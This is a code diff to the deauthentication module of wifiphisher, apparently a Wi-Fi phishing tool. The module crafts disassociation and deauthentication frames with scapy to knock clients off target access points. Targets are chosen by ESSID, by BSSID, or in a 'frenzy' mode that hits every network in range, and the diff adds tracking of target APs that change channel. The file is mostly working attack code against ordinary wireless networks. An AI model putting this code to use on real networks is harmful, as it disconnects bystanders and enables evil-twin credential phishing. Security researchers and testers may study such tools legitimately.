@@ -10,9 +10,19 @@ from collections import defaultdict
 import scapy.layers.dot11 as dot11
 import wifiphisher.common.constants as constants
 
-
 logger = logging.getLogger(__name__)
 
+def is_deauth_frame(packet):
+    """
+    Determine if the sending frame is deauth frame
+    :param packet: A scapy.layers.RadioTap object
+    :type packet: scapy.layers.RadioTap
+    :return: True if the frame is belonged to deauth module
+    :rtype: bool
+    """
+    if packet.subtype == 10 or packet.subtype == 12:
+        return True
+    return False
 
 class Deauth(object):
     """
@@ -35,7 +45,7 @@ class Deauth(object):
         self._should_continue = True
         self._data = data
         # the bssids having the same ESSID
-        self._deauth_bssids = set()
+        self._deauth_bssids = dict()
         # channel mapping to the frames list
         self._packets_to_send = defaultdict(list)
 
@@ -56,11 +66,14 @@ class Deauth(object):
         """
 
         # craft disassociation packet
-        disassoc_part = dot11.Dot11(type=0, subtype=10, addr1=receiver, addr2=sender, addr3=bssid)
-        disassoc_packet = (dot11.RadioTap() / disassoc_part / dot11.Dot11Disas())
+        disassoc_part = dot11.Dot11(
+            type=0, subtype=10, addr1=receiver, addr2=sender, addr3=bssid)
+        disassoc_packet = (
+            dot11.RadioTap() / disassoc_part / dot11.Dot11Disas())
 
         # craft deauthentication packet
-        deauth_part = dot11.Dot11(type=0, subtype=12, addr1=receiver, addr2=sender, addr3=bssid)
+        deauth_part = dot11.Dot11(
+            type=0, subtype=12, addr1=receiver, addr2=sender, addr3=bssid)
         deauth_packet = (dot11.RadioTap() / deauth_part / dot11.Dot11Deauth())
 
         return [disassoc_packet, deauth_packet]
@@ -84,10 +97,9 @@ class Deauth(object):
         from_ds = ds_value & 0x2 != 0
 
         # return the correct bssid based on the type
-        return ((not to_ds and not from_ds and packet.addr3) or
-                (not to_ds and from_ds and packet.addr2) or
-                (to_ds and not from_ds and packet.addr1) or
-                None)
+        return ((not to_ds and not from_ds and packet.addr3)
+                or (not to_ds and from_ds and packet.addr2)
+                or (to_ds and not from_ds and packet.addr1) or None)
 
     def _is_target(self, packet):
         """
@@ -100,25 +112,24 @@ class Deauth(object):
         :rtype: bool
         """
 
-        if (packet.addr3 != self._data.rogue_ap_mac and packet.addr3
-                not in self._deauth_bssids):
+        if (packet.addr3 != self._data.rogue_ap_mac
+                and packet.addr3 not in self._deauth_bssids):
             try:
                 essid = packet[dot11.Dot11Elt].info.decode("utf8")
             except UnicodeDecodeError:
-                logger.warning("Unable to decode the essid with with bssid {}"
-                               .format(packet.addr3))
+                logger.warning("Unable to decode the essid with with bssid %s",
+                               packet.addr3)
                 return False
 
             # only compare essid when -dE is given
-            return ((self._data.args.deauth_essid and
-                     essid == self._data.target_ap_essid) or
+            return ((self._data.args.deauth_essid
+                     and essid == self._data.target_ap_essid) or
                     # frenzy deauth
-                    (not self._data.args.deauth_essid and
-                     not self._data.target_ap_bssid) or
+                    (not self._data.args.deauth_essid
+                     and not self._data.target_ap_bssid) or
                     # target_ap_bssid without -dE option
-                    (not self._data.args.deauth_essid and
-                     self._data.target_ap_bssid == packet.addr3) or
-                    False)
+                    (not self._data.args.deauth_essid
+                     and self._data.target_ap_bssid == packet.addr3) or False)
 
     def get_packet(self, packet):
         """
@@ -162,16 +173,24 @@ class Deauth(object):
 
         bssid = self._extract_bssid(packet)
         # check beacon if this is our target deauthing BSSID
-        if (packet.haslayer(dot11.Dot11Beacon) and bssid not in self._deauth_bssids
+        if (packet.haslayer(dot11.Dot11Beacon)
+                and bssid not in self._deauth_bssids
                 and self._is_target(packet)):
             # listen beacon to get the target attacking BSSIDs for the
             # specified ESSID
             packets_to_send += self._craft_packet(bssid,
                                                   constants.WIFI_BROADCAST,
                                                   bssid)
-            logger.info("Target deauth BSSID found: {0}".format(bssid))
-            self._deauth_bssids.add(bssid)
-
+            logger.info("Target deauth BSSID found: %s", bssid)
+            # remember the channel of the given bssid
+            self._deauth_bssids[bssid] = str(channel)
+        elif bssid in self._deauth_bssids:
+            # the bssid is already in the deauth set and we need to check
+            # if the channel of the target AP has been changed
+            if str(channel) != self._deauth_bssids[bssid]:
+                logger.info("BSSID: %s changes channel to %d", bssid, channel)
+                self._update_target_ap_frames(str(channel),
+                                              str(self._deauth_bssids[bssid]), bssid)
         if bssid not in self._deauth_bssids:
             return self._packets_to_send
 
@@ -179,11 +198,37 @@ class Deauth(object):
         if clients:
             self._observed_clients.add(clients[0])
             packets_to_send += clients[1]
-            logger.info("Client with BSSID {} is now getting deauthenticated".format(clients[0]))
+            logger.info("Client with BSSID %s is now getting deauthenticated", clients[0])
 
         self._packets_to_send[str(channel)] += packets_to_send
 
         return self._packets_to_send
+
+    def _update_target_ap_frames(self, new_channel, old_channel, bssid):
+        """
+        :param self: A Deauth object
+        :param new_channel: New channel for the target AP
+        :param old_channel: Old channel for the target AP
+        :type self: Deauth
+        :param bssid: Address of the bssid
+        :type new_channel: str
+        :type old_channel: str
+        :type bssid: str
+        :return: None
+        :rtype: None
+        """
+        old_channel_list = []
+        new_channel_list = []
+        for pkt in self._packets_to_send[old_channel]:
+            if pkt.addr3 != bssid:
+                old_channel_list.append(pkt)
+            else:
+                new_channel_list.append(pkt)
+        self._packets_to_send[old_channel] = old_channel_list
+        # append the frames of target AP to the new channel
+        self._packets_to_send[new_channel].extend(new_channel_list)
+        # update the channel of bssid
+        self._deauth_bssids[bssid] = new_channel
 
     def _add_clients(self, sender, receiver, bssid):
         """
@@ -203,7 +248,8 @@ class Deauth(object):
         """
 
         # addresses that are not acceptable
-        non_valid_addresses = constants.NON_CLIENT_ADDRESSES.union(self._observed_clients)
+        non_valid_addresses = constants.NON_CLIENT_ADDRESSES.union(
+            self._observed_clients)
 
         # craft the packets
         packets = lambda: (self._craft_packet(receiver, sender, bssid) +
@@ -211,11 +257,11 @@ class Deauth(object):
 
         # return the client and packets if valid and None otherwise
         # it uses short circuiting to improve performance
-        return (sender not in non_valid_addresses and
-                receiver not in non_valid_addresses and
-                (sender == bssid and (receiver, packets()) or
-                 receiver == bssid and (sender, packets())) or
-                None)
+        return (sender not in non_valid_addresses
+                and receiver not in non_valid_addresses and
+                (sender == bssid and
+                 (receiver, packets()) or receiver == bssid and
+                 (sender, packets())) or None)
 
     def send_output(self):
         """
@@ -242,6 +288,17 @@ class Deauth(object):
         if not self._data.is_freq_hop_allowed:
             return [self._data.target_ap_channel]
 
-        if self._data.target_ap_bssid and not self._data.args.deauth_essid:
+        if self._data.target_ap_bssid and not self._data.args.deauth_essid\
+                and not self._data.args.channel_monitor:
             return [self._data.target_ap_channel]
         return map(str, constants.ALL_2G_CHANNELS)
+
+    def on_exit(self):
+        """
+        Free all the resources regarding to this module
+        :param self: A Deauth object
+        :type self: Deauth
+        :return: None
+        :rtype: None
+        """
+        pass
